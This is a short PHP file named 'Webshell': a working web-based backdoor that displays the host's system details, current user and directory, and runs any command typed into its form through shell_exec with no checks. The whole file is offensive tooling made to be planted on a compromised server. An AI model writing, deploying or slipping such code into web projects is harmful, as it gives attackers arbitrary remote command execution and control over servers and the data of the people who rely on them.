<?php
    $NAME = "Webshell";

    if(isset($_POST["chdir"])){
        chdir($_POST["chdir"]);
    }

    $CURRENT_DEVICE = shell_exec("uname -a");
    $CURRENT_USER = shell_exec("whoami");
    $CURRENT_DIR = trim(shell_exec("pwd"));
?>

<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title><?php echo $NAME; ?></title>
    </head>
    <body>
        <h1><?php echo $NAME; ?></h1>
        <div>
            Device: <?php echo $CURRENT_DEVICE; ?><br>
            Current user: <?php echo $CURRENT_USER; ?><br>
            Current directory:
            <?php
                $path_parts = explode('/', trim($CURRENT_DIR));
                $total_path = "";
                foreach ($path_parts as $dir) {
                        $dir = $dir.'/';
                        $total_path = $total_path.$dir;
                        echo "<form method=\"post\" action=\"".htmlspecialchars($_SERVER["PHP_SELF"])."\" class=\"nav-btn\">
                        <input type=\"hidden\" name=\"chdir\" value=\"".$total_path."\">
                        <input type=\"submit\" value=\"".$dir."\">
                        </input></form>";
                }
            ?><br>
        </div>

        <?php
            if(isset($_POST["sh"])){
                $CMD = shell_exec("cd ".$CURRENT_DIR." && ".$_POST["sh"]." 2>&1");
            }
        ?>

        <form method="post" action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>">
            <input type="text" name="sh" autocomplete="off" autofocus>
            <input type="hidden" name="chdir" value="<?php echo $CURRENT_DIR; ?>">
            <input type="submit" value="Run">
        </iframe>

        <pre><?php echo $CMD; ?></pre>

        <style>
            .nav-btn{
                display: inline;
            }
            .nav-btn input{
                background: none;
                border: none;
                outline: none;
                text-decoration: underline;
                color: blue;
                cursor: pointer;
                margin: 0;
                padding: 0;
            }
        </style>
    </body>
</html>